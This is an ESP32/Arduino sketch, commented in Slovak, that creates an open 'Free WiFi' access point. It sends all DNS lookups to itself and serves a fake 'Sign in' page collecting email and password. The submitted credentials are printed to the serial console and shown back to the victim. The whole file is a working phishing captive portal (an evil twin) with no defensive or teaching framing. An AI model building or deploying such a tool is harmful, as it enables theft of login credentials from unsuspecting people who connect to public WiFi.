#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Konfigurácia siete
#define SSID_NAME "Free WiFi"
IPAddress APIP(172, 0, 0, 1);  // IP adresa AP (Gateway)
const byte DNS_PORT = 53;      // DNS port

// Inicializácia serverov
DNSServer dnsServer;
WebServer webServer(80);

// HTML hlavička pre webové stránky
String header(String title) {
  String css = "body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f8f8; color: #333; padding: 20px; }"
               "input { width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }"
               "button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }"
               "button:hover { background-color: #0056b3; }";
  return "<!DOCTYPE html><html><head><title>" + title + "</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>" + css + "</style></head><body><h1>" + title + "</h1>";
}

// Spracovanie prihlasovacieho formulára
String handlePost() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");
  Serial.println("Nové prihlásenie:");
  Serial.println("Email: " + email);
  Serial.println("Heslo: " + password);
  
  return header("Validating...") + "<p>Údaje boli prijaté.</p><p>Email: <b>" + email + "</b></p><p>Password: <b>" + password + "</b></p><p>Pripojenie prebieha, prosím, čakajte...</p></body></html>";
}

// Nastavenie AP a webservera
void setup() {
  Serial.begin(115200);
  
  // Vytvorenie Wi-Fi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  Serial.println("Access Point '" + String(SSID_NAME) + "' spustený.");

  // DNS presmerovanie
  dnsServer.start(DNS_PORT, "*", APIP);

  // Nastavenie webového servera
  webServer.on("/", []() {
    webServer.send(200, "text/html", header("Sign in") + 
      "<form method='post' action='/post'>"
      "<label>Email:</label><input type='text' name='email' required><br>"
      "<label>Password:</label><input type='password' name='password' required><br>"
      "<button type='submit'>Sign in</button></form></body></html>");
  });

  webServer.on("/post", []() {
    webServer.send(200, "text/html", handlePost());
  });

  webServer.onNotFound([]() {
    webServer.send(200, "text/html", header("Sign in") + 
      "<form method='post' action='/post'>"
      "<label>Email:</label><input type='text' name='email' required><br>"
      "<label>Password:</label><input type='password' name='password' required><br>"
      "<button type='submit'>Sign in</button></form></body></html>");
  });

  webServer.begin();
  Serial.println("Webserver spustený.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
